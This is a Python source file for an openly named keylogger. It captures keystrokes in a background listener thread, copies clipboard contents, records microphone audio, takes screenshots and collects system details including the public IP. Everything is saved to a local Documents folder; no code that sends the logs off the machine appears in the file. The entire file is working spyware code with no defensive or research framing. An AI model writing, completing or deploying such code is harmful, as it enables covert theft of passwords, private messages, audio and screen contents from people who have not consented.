import os
import socket
import platform
import win32clipboard 
import sounddevice as sd 
from scipy.io.wavfile import write
from PIL import ImageGrab 
from cryptography.fernet import Fernet 
from pynput.keyboard import Key, Listener 
from requests import get 
import threading

# === Fixed File Path ===
file_path = os.path.expanduser("~\\Documents\\KeyLogger")
os.makedirs(file_path, exist_ok=True)

# === File Names ===
keys_information = "key_log.txt"
system_information = "syseminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

# === Helper: Write text data ===
def write_to_file(name, data):
    with open(os.path.join(file_path, name), 'a') as f:
        f.write(data + '\n')

# === System Info ===
def computer_information():
    try:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        public_ip = get("https://api.ipify.org").text
        sys_info = (
            f"Public IP Address: {public_ip}\n"
            f"Processor: {platform.processor()}\n"
            f"System: {platform.system()} {platform.version()}\n"
            f"Machine: {platform.machine()}\n"
            f"Hostname: {hostname}\n"
            f"Private IP Address: {IPAddr}\n"
        )
        write_to_file(system_information, sys_info)
    except Exception as e:
        write_to_file(system_information, "System info error: " + str(e))

# === Clipboard ===
def copy_clipboard():
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        write_to_file(clipboard_information, "Clipboard Data:\n" + data)
    except:
        write_to_file(clipboard_information, "Clipboard could not be copied.")

# === Microphone ===
def microphone(duration=5):
    fs = 44100
    myrecording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
    sd.wait()
    write(os.path.join(file_path, audio_information), fs, myrecording)

# === Screenshot ===
def screenshot():
    img = ImageGrab.grab()
    img.save(os.path.join(file_path, screenshot_information))

# === Keylogger ===
keys = []
listener = None

def on_press(key):
    try:
        k = str(key.char)
    except AttributeError:
        if key == Key.space:
            k = ' '
        else:
            k = str(key)
    keys.append(k)
    if len(keys) >= 10:
        write_keys(keys)
        keys.clear()

def write_keys(keys):
    with open(os.path.join(file_path, keys_information), "a") as f:
        for key in keys:
            f.write(key + ' ')
        f.write('\n')

def on_release(key):
    if key == Key.esc:
        return False

def start_keylogger():
    global listener
    if listener is None:
        listener = Listener(on_press=on_press, on_release=on_release)
        thread = threading.Thread(target=listener.start)
        thread.start()

def stop_keylogger():
    global listener
    if listener is not None:
        listener.stop()
        listener = None

def read_logs():
    log_file = os.path.join(file_path, keys_information)
    if os.path.exists(log_file):
        with open(log_file, 'r') as f:
            return f.read()
    return ""
